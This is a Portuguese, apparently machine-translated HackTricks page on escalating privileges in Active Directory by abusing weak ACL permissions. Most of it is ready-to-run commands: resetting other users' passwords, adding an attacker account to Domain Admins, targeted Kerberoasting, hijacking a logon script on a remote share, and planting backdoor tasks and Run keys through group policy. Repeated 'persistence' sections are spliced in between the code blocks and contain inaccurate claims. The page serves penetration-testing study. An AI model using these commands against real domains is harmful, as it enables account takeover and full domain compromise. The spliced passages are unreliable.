# Abusando de ACLs/ACEs do Active Directory

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Contexto

Este laboratório é para abusar das permissões fracas das Listas de Controle de Acesso Discricionário (DACLs) e Entradas de Controle de Acesso (ACEs) do Active Directory que compõem as DACLs.

Objetos do Active Directory, como usuários e grupos, são objetos seguráveis e as DACL/ACEs definem quem pode ler/modificar esses objetos (ou seja, alterar o nome da conta, redefinir a senha, etc).

Um exemplo de ACEs para o objeto segurável "Administradores de Domínio" pode ser visto aqui:

![](../../../.gitbook/assets/1.png)

Algumas das permissões e tipos de objetos do Active Directory que nós, como atacantes, estamos interessados são:

* **GenericAll** - direitos completos sobre o objeto (adicionar usuários a um grupo ou redefinir a senha do usuário)
* **GenericWrite** - atualizar os atributos do objeto (ou seja, script de logon)
* **WriteOwner** - mudar o proprietário do objeto para um usuário controlado pelo atacante e assumir o controle do objeto
* **WriteDACL** - modificar as ACEs do objeto e dar ao atacante o direito de controle total sobre o objeto
* **AllExtendedRights** - capacidade de adicionar usuário a um grupo ou redefinir senha
* **ForceChangePassword** - capacidade de alterar a senha do usuário
* **Self (Self-Membership)** - capacidade de adicionar-se a um grupo

Neste laboratório, vamos explorar e tentar explorar a maioria das ACEs acima.

Vale a pena familiarizar-se com todas as [arestas do BloodHound](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html) e com o maior número possível de [Direitos Estendidos](https://learn.microsoft.com/en-us/windows/win32/adschema/extended-rights) do Active Directory, pois nunca se sabe quando pode encontrar um menos comum durante uma avaliação.

## GenericAll em Usuário

Usando o powerview, vamos verificar se nosso usuário atacante `spotless` tem direitos `GenericAll` no objeto AD para o usuário `delegate`:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```
Podemos ver que, de fato, nosso usuário `spotless` tem direitos de `GenericAll`, permitindo efetivamente que o invasor assuma a conta:

![](../../../.gitbook/assets/2.png)

*   **Alterar senha**: Você pode simplesmente alterar a senha desse usuário com

    ```bash
    net user <username> <password> /domain
    ```
*   **Kerberoasting direcionado**: Você pode tornar o usuário **kerberoastable** definindo um **SPN** na conta, kerberoast e tentar quebrar offline:

    ```powershell
    # Definir SPN
    Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
    # Obter Hash
    .\Rubeus.exe kerberoast /user:<username> /nowrap
    # Limpar SPN
    Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose

    # Você também pode usar a ferramenta https://github.com/ShutdownRepo/targetedKerberoast 
    # para obter hashes de um ou todos os usuários
    python3 targetedKerberoast.py -domain.local -u <username> -p password -v
    ```
*   **ASREPRoasting direcionado**: Você pode tornar o usuário **ASREPRoastable** **desabilitando** a **pré-autenticação** e, em seguida, ASREProast.

    ```powershell
    Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
    ```

## GenericAll em Grupo

Vamos ver se o grupo `Domain admins` tem permissões fracas. Primeiro, vamos obter seu `distinguishedName`:
```csharp
Get-NetGroup "domain admins" -FullData
```
# Abuso de Persistência de ACL

## Descrição

O abuso de persistência de ACL é uma técnica de persistência que envolve a modificação de permissões de acesso em objetos do Active Directory para garantir acesso futuro. Essa técnica é particularmente útil para manter o acesso após a escalada de privilégios.

## Detalhes

O Active Directory usa listas de controle de acesso (ACLs) para controlar o acesso a objetos, como usuários, grupos e computadores. As ACLs contêm entradas de permissão que especificam quais usuários e grupos têm acesso a um objeto e que tipo de acesso eles têm. As permissões podem ser modificadas por usuários com privilégios suficientes, como administradores de domínio.

O abuso de persistência de ACL envolve a modificação de permissões de acesso em objetos do Active Directory para garantir acesso futuro. Por exemplo, um invasor pode adicionar sua conta de usuário a um grupo de administradores de domínio ou conceder permissões de controle total a um objeto do Active Directory que contém informações confidenciais. Dessa forma, o invasor pode manter o acesso mesmo que suas credenciais originais sejam revogadas.

## Exemplo

Um invasor com acesso de leitura em um objeto do Active Directory pode usar a ferramenta `dsacls` para visualizar as permissões de acesso no objeto:

```
dsacls.exe "CN=Domain Admins,CN=Users,DC=example,DC=com"
```

O invasor pode então usar a ferramenta `dsadd` para adicionar sua conta de usuário ao grupo de administradores de domínio:

```
dsadd.exe "CN=Domain Admins,CN=Users,DC=example,DC=com" -members "CN=Hacker,CN=Users,DC=example,DC=com"
```

O invasor agora tem acesso de administrador de domínio e pode usar outras técnicas de escalada de privilégios para obter acesso persistente.

## Mitigação

Para mitigar o abuso de persistência de ACL, é importante limitar o número de usuários com privilégios suficientes para modificar as permissões de acesso em objetos do Active Directory. Além disso, é importante monitorar as alterações nas permissões de acesso e restringir o acesso a objetos que contêm informações confidenciais.
```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```
Podemos ver que nosso usuário de ataque `spotless` tem direitos `GenericAll` mais uma vez:

![](../../../.gitbook/assets/5.png)

Efetivamente, isso nos permite adicionar a nós mesmos (o usuário `spotless`) ao grupo `Domain Admin`:
```csharp
net group "domain admins" spotless /add /domain
```
O mesmo pode ser alcançado com o módulo Active Directory ou PowerSploit:
```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
## GenericAll / GenericWrite / Write no Computador/Usuário

* Se você tiver esses privilégios em um **objeto de computador**, você pode realizar a técnica de [Delegação Restrita Baseada em Recursos do Kerberos: Assumir o controle do objeto de computador](../resource-based-constrained-delegation.md).
* Se você tiver esses privilégios em um usuário, você pode usar um dos [primeiros métodos explicados nesta página](./#genericall-on-user).
* Ou, se você tiver esses privilégios em um computador ou usuário, você pode usar as **Credenciais de Sombra** para se passar por ele:

{% content-ref url="shadow-credentials.md" %}
[shadow-credentials.md](shadow-credentials.md)
{% endcontent-ref %}

## WriteProperty no Grupo

Se o usuário controlado tiver o direito de `WriteProperty` em `All` objetos para o grupo `Domain Admin`:

![](../../../.gitbook/assets/7.png)

Podemos adicionar a nós mesmos ao grupo `Domain Admins` e escalar privilégios:
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## Autoassociação (Autoassociação) em Grupo

Outro privilégio que permite ao atacante adicionar-se a um grupo:

![](../../../.gitbook/assets/9.png)
```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## WriteProperty (Autoassociação)

Mais um privilégio que permite ao atacante adicionar-se a um grupo:
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
# Abuso de Persistência de ACL

## Descrição

O abuso de persistência de ACL é uma técnica de persistência que envolve a modificação de permissões de acesso em objetos do Active Directory para garantir acesso futuro. Essa técnica é particularmente útil para manter o acesso após a exploração inicial do ambiente.

## Detalhes

O Active Directory usa listas de controle de acesso (ACLs) para definir permissões em objetos, como usuários, grupos e computadores. As ACLs contêm uma lista de identidades de segurança e as permissões que cada identidade tem em relação ao objeto. As permissões incluem coisas como ler, gravar, modificar e excluir.

Os atacantes podem abusar da persistência de ACL modificando as permissões em objetos do Active Directory para garantir acesso futuro. Por exemplo, um atacante pode adicionar sua própria conta de usuário a um grupo de administradores de domínio ou conceder permissões de leitura/gravação em um objeto de serviço que contém senhas de usuário.

Os atacantes podem usar várias ferramentas e técnicas para abusar da persistência de ACL, incluindo:

* Ferramentas de linha de comando, como `dsacls.exe` e `icacls.exe`
* Ferramentas de terceiros, como BloodHound e PowerSploit
* Scripts personalizados

## Mitigação

Para mitigar o abuso de persistência de ACL, as organizações devem implementar as seguintes práticas recomendadas:

* Monitorar as alterações de permissão em objetos do Active Directory
* Limitar o número de usuários com permissões de administrador de domínio
* Implementar o princípio do menor privilégio
* Usar grupos de segurança para gerenciar permissões em objetos do Active Directory
* Implementar a autenticação multifator para contas de usuário com permissões elevadas

## Créditos

* [Harmj0y](https://twitter.com/HarmJ0y) - Desenvolvedor do BloodHound e co-fundador da SpecterOps
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) - Coleção de scripts do PowerShell para pós-exploração e persistência
```csharp
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Se tivermos `ExtendedRight` no tipo de objeto `User-Force-Change-Password`, podemos redefinir a senha do usuário sem saber a senha atual:
```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
Fazendo o mesmo com o powerview:
```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```
Outro método que não requer mexer com a conversão de senha segura em string:
```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```
...ou um comando em uma linha, se não houver uma sessão interativa disponível:
```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../../.gitbook/assets/16.png)

E uma última maneira de realizar isso a partir do Linux:
```markup
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## WriteOwner no Grupo

Observe que antes do ataque o proprietário do `Domain Admins` é `Domain Admins`:

![](../../../.gitbook/assets/17.png)

Após a enumeração ACE, se descobrirmos que um usuário sob nosso controle tem direitos de `WriteOwner` em `ObjectType:All`...
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```
Podemos alterar o proprietário do objeto `Domain Admins` para nosso usuário, que no nosso caso é `spotless`. Observe que o SID especificado com `-Identity` é o SID do grupo `Domain Admins`:
```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
//You can also use the name instad of the SID (HTB: Reel)
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## GenericWrite no Usuário

O objetivo deste método é obter persistência em um ambiente do Active Directory usando a permissão `GenericWrite` em um objeto de usuário. Essa permissão permite que um usuário modifique as permissões de outros usuários, incluindo a si mesmo. Isso pode ser usado para obter privilégios elevados em uma conta de usuário ou para criar uma nova conta de usuário com privilégios elevados.

### Passo a passo

1. Identifique um usuário com a permissão `GenericWrite` em seu objeto. Isso pode ser feito usando a ferramenta BloodHound ou por meio de engenharia reversa das permissões do usuário.
2. Modifique as permissões do objeto do usuário para conceder a si mesmo ou a outro usuário privilégios elevados, como a adição de um usuário a um grupo de administradores do domínio.
3. Use as novas permissões para obter acesso persistente ao ambiente do Active Directory.

### Mitigação

Para mitigar esse tipo de ataque, é recomendável limitar as permissões `GenericWrite` em objetos de usuário a usuários confiáveis e monitorar as alterações nas permissões do usuário. Além disso, é importante limitar o número de usuários com privilégios elevados e monitorar as alterações nas permissões desses usuários.
```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
`WriteProperty` em um `ObjectType`, que neste caso particular é `Script-Path`, permite que o invasor sobrescreva o caminho do script de logon do usuário `delegate`, o que significa que na próxima vez em que o usuário `delegate` fizer login, seu sistema executará nosso script malicioso:
```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
Abaixo mostra o campo de script de logon do usuário ~~`delegate`~~ atualizado no AD:

![](../../../.gitbook/assets/21.png)

## GenericWrite no Grupo

Isso permite que você defina como membros do grupo novos usuários (você mesmo, por exemplo):
```powershell
# Create creds
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd) 
# Add user to group
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
# Check user was added
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
# Remove group member
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## WriteDACL + WriteOwner

Se você é o proprietário de um grupo, como eu sou o proprietário de um grupo AD `Test`:

![](../../../.gitbook/assets/22.png)

O que você pode, é claro, fazer através do powershell:
```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```
Se você tem permissão `WriteDACL` nesse objeto AD:

![](../../../.gitbook/assets/24.png)

...você pode se dar privilégios [`GenericAll`](../../../windows/active-directory-methodology/broken-reference/) com um pouco de feitiçaria ADSI:
```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
O que significa que agora você tem controle total sobre o objeto AD:

![](../../../.gitbook/assets/25.png)

Isso efetivamente significa que agora você pode adicionar novos usuários ao grupo.

Interessante notar que eu não pude abusar desses privilégios usando o módulo Active Directory e os cmdlets `Set-Acl` / `Get-Acl`:
```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```
![](../../../.gitbook/assets/26.png)

## **Replicação no domínio (DCSync)**

A permissão **DCSync** implica ter essas permissões sobre o próprio domínio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** e **Replicating Directory Changes In Filtered Set**.\
[**Saiba mais sobre o ataque DCSync aqui.**](../dcsync.md)

## Delegação de GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

Às vezes, certos usuários/grupos podem ser delegados para gerenciar objetos de política de grupo, como é o caso do usuário `offense\spotless`:

![](../../../.gitbook/assets/a13.png)

Podemos ver isso usando o PowerView assim:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
O abaixo indica que o usuário `offense\spotless` tem privilégios de **WriteProperty**, **WriteDacl**, **WriteOwner** entre outros que são propícios para abuso:

![](../../../.gitbook/assets/a14.png)

### Enumerar Permissões de GPO <a href="#abusing-the-gpo-permissions" id="abusing-the-gpo-permissions"></a>

Sabemos que o ObjectDN acima da captura de tela acima se refere ao GPO `New Group Policy Object`, já que o ObjectDN aponta para `CN=Policies` e também para `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}`, que é o mesmo nas configurações do GPO, como destacado abaixo:

![](../../../.gitbook/assets/a15.png)

Se quisermos procurar especificamente por GPOs mal configurados, podemos encadear vários cmdlets do PowerSploit da seguinte maneira:
```powershell
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
**Computadores com uma Política Aplicada Específica**

Agora podemos resolver os nomes dos computadores em que a GPO `Política Mal Configurada` é aplicada:
```powershell
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```
**Políticas Aplicadas a um Computador Específico**

Este método pode ser usado para identificar as políticas aplicadas a um computador específico. Isso pode ser útil para identificar quais políticas estão sendo aplicadas a um controlador de domínio ou a um servidor de arquivos. Para fazer isso, você pode usar o seguinte comando:

```
gpresult /h report.html
```

Este comando irá gerar um relatório HTML que contém informações sobre as políticas aplicadas ao computador. Você pode abrir o relatório em um navegador da web para visualizar as informações. O relatório incluirá informações sobre as políticas de computador e usuário aplicadas, bem como informações sobre as configurações de segurança aplicadas ao computador.
```powershell
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```
**OUs com uma política aplicada**

Esta seção descreve como encontrar OUs que têm uma política específica aplicada. Isso pode ser útil para encontrar OUs que possam ser alvos de abuso de persistência de ACL. Para fazer isso, você pode usar o cmdlet `Get-GPOReport` para gerar um relatório HTML de todas as políticas de grupo aplicadas e, em seguida, pesquisar o relatório para a política específica que você está procurando. Aqui está um exemplo:

```
Get-GPOReport -All -ReportType HTML -Path AllGPOs.html
```

Este comando gera um relatório HTML de todas as políticas de grupo aplicadas e as salva em um arquivo chamado `AllGPOs.html`. Em seguida, você pode pesquisar o arquivo HTML para a política específica que você está procurando. Por exemplo, se você estiver procurando por uma política chamada "Política de Segurança", poderá pesquisar o arquivo HTML usando o seguinte comando:

```
Select-String -Path AllGPOs.html -Pattern "Política de Segurança"
```

Este comando pesquisa o arquivo HTML `AllGPOs.html` para a string "Política de Segurança" e retorna todas as linhas que contêm essa string. Se houver uma linha que corresponda à política que você está procurando, ela mostrará o nome da política e o caminho da OU em que ela está aplicada.
```powershell
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```
![](https://blobs.gitbook.com/assets%2F-LFEMnER3fywgFHoroYn%2F-LWNAqc8wDhu0OYElzrN%2F-LWNBtLT332kTVDzd5qV%2FScreenshot%20from%202019-01-16%2019-46-33.png?alt=media\&token=ec90fdc0-e0dc-4db0-8279-cde4720df598)

### **Abuso do GPO -** [New-GPOImmediateTask](https://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1)

Uma das maneiras de abusar dessa má configuração e obter a execução de código é criar uma tarefa agendada imediata por meio do GPO, como mostrado abaixo:
```powershell
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
![](../../../.gitbook/assets/a19.png)

O código acima adicionará nosso usuário "spotless" ao grupo local `administrators` do computador comprometido. Observe que, antes da execução do código, o grupo não contém o usuário `spotless`:

![](../../../.gitbook/assets/a20.png)

### Módulo GroupPolicy **- Abuso de GPO**

{% hint style="info" %}
Você pode verificar se o módulo GroupPolicy está instalado com `Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`. Em caso de necessidade, você pode instalá-lo com `Install-WindowsFeature –Name GPMC` como administrador local.
{% endhint %}
```powershell
# Create new GPO and link it with the OU Workstrations
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
# Make the computers inside Workstrations create a new reg key that will execute a backdoor
## Search a shared folder where you can write and all the computers affected can read
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
Este payload, após a atualização do GPO, também precisará que alguém faça login no computador.

### [**SharpGPOAbuse**](https://github.com/FSecureLABS/SharpGPOAbuse) **- Abuso de GPO**

{% hint style="info" %}
Não pode criar GPOs, portanto, ainda precisamos fazer isso com RSAT ou modificar um ao qual já temos acesso de gravação.
{% endhint %}
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forçar Atualização de Política <a href="#force-policy-update" id="force-policy-update"></a>

As atualizações abusivas anteriores do **GPO são recarregadas** aproximadamente a cada 90 minutos.\
Se você tiver acesso ao computador, pode forçá-lo com `gpupdate /force`.

### Sob o capô <a href="#under-the-hood" id="under-the-hood"></a>

Se observarmos as Tarefas Agendadas do GPO `Misconfigured Policy`, podemos ver nossa `evilTask` sentada lá:

![](../../../.gitbook/assets/a22.png)

Abaixo está o arquivo XML que foi criado por `New-GPOImmediateTask` que representa nossa tarefa agendada maliciosa no GPO:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description></Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>cmd</Command>
                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```
### Usuários e Grupos <a href="#usuários-e-grupos" id="usuários-e-grupos"></a>

A mesma escalada de privilégios pode ser alcançada abusando da funcionalidade de Usuários e Grupos do GPO. Observe no arquivo abaixo, na linha 6, onde o usuário `spotless` é adicionado ao grupo local `administrators` - podemos alterar o usuário para outra coisa, adicionar outro ou até mesmo adicionar o usuário a outro grupo/múltiplos grupos, já que podemos alterar o arquivo de configuração da política no local mostrado devido à delegação do GPO atribuída ao nosso usuário `spotless`:

{% code title="\offense.local\SysVol\offense.local\Policies\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\Machine\Preferences\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
            <Members>
                <Member name="spotless" action="ADD" sid="" />
            </Members>
        </Properties>
    </Group>
</Groups>
```
Além disso, poderíamos pensar em aproveitar scripts de logon/logoff, usar o registro para autoruns, instalar .msi, editar serviços e outras formas de execução de código.

## Referências

* Inicialmente, esta informação foi em grande parte copiada de [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
* [https://wald0.com/?p=112](https://wald0.com/?p=112)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
* [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
